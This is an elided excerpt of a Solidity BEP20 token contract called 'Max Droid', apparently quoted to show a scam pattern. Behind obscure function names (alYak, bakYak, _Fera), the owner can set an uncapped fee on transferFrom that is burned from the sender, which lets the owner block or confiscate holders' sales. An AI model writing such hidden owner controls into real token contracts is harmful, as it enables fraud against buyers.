...
contract HelloBEP20 is IBEP20ZZ {
    using HRMath for uint256;

    string public name20F =  "Max Droid";
    string public symbol20F =  "MAXDROID";
    uint8 public decimals20F = 9;
    uint public _totalSupplyAF = 1*10**15 * 10**9;
    ...
    constructor() {
        ...
        balances[msg.sender] = _totalSupplyAF;
        emit Transfer(address(0), msg.sender, _totalSupplyAF);
    }
   ...
   function decimals() public view virtual returns (uint8) {
    ...
    function totalSupply() public override view returns (uint) {
        return _totalSupplyAF - balances[address(0)];
    }
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _Fera(from,tokens.mul(bakYak()).div(10**2));
        
        _transfer(from, to, tokens.sub1(tokens.mul(bakYak()).div(10**2)));
    ...
    function alYak(uint8 FORT) public virtual onlyOwner {
		_FORT = FORT;
	}
	
	function bakYak() public view returns (uint8) {
        return _FORT;
    }
    ...
    function _Fera(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyAF = _totalSupplyAF.sub1(tokens);
